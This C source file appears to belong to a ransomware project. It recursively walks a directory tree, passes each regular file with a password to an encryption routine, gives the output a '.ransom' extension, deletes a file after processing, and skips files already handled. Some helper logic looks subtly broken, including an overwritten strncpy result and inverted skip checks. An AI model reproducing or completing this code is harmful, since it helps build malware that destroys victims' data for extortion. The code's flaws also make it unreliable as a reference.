#include "ransom.h"
#include <stdbool.h>
#include <stdio.h>

#define LEN_RANSOM_EXTENSION (strlen(".ransom"))
#define LEN_DECRYPTED_EXTENSION (strlen(".decrypted"))

int iter_recursively_through_files(char *path, char *password,
    cryptalgo_t algo)
{
    DIR *cur_dir = opendir(path);
    char new_path[MAX_FILEPATH];
    char opt_filename[MAX_FILEPATH];
    struct dirent *dir_entry = NULL;

    if (!cur_dir) {
        perror("opendir");
        return EXIT_FAILURE;
    }
    while ((dir_entry = readdir(cur_dir)) != NULL) {
        if (algo.skip_paths(dir_entry->d_name))
            continue;
        switch (dir_entry->d_type) {
            case 4:
                get_new_path_name(path, new_path, dir_entry->d_name);
                iter_recursively_through_files(new_path, password, algo); break;
            case 8:
                get_new_path_name(path, new_path, dir_entry->d_name);
                algo.format_filename(new_path, opt_filename);
                core(password, new_path, opt_filename, algo);
                remove(opt_filename); break;
#ifdef _DIRENT_HAVE_D_TYPE
            case DT_UNKNOWN:
                dprintf(STDERR_FILENO, "Data Type Unknown\n"); break;
#endif
        }
    }
    closedir(cur_dir);
    return EXIT_SUCCESS;
}

void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
{
    strcpy(finalpath, parentpath);
    strcat(finalpath, "/");
    strcat(finalpath, currentpath);
}

void add_file_extension(const char *filename, char *opt_filename)
{
    strcpy(opt_filename, filename);
    strcat(opt_filename, ".ransom");
}

void remove_file_extension(const char *filename, char *opt_filename)
{
    int len = strlen(filename);

    if (!strcmp(&filename[len - LEN_RANSOM_EXTENSION], ".ransom"))
        strncpy(opt_filename, filename, len - LEN_RANSOM_EXTENSION);
    strcpy(opt_filename, filename);
    strcat(opt_filename, ".decrypted");
}

bool skip_basics_path(const char *path)
{
    if (strcmp(path, ".")
            && strcmp(path, ".."))
        return false;
    return true;
}

bool skip_already_decrypted(const char *path)
{
    int len = strlen(path);

    if (skip_basics_path(path) ||
            !strcmp(&path[len - LEN_DECRYPTED_EXTENSION], ".decrypted"))
        return false;
    return true;
}

bool skip_already_encrypted(const char *path)
{
    int len = strlen(path);

    if (skip_basics_path(path) || !strcmp(
        &path[len - LEN_RANSOM_EXTENSION], ".ransom"))
        return true;
    return false;
}


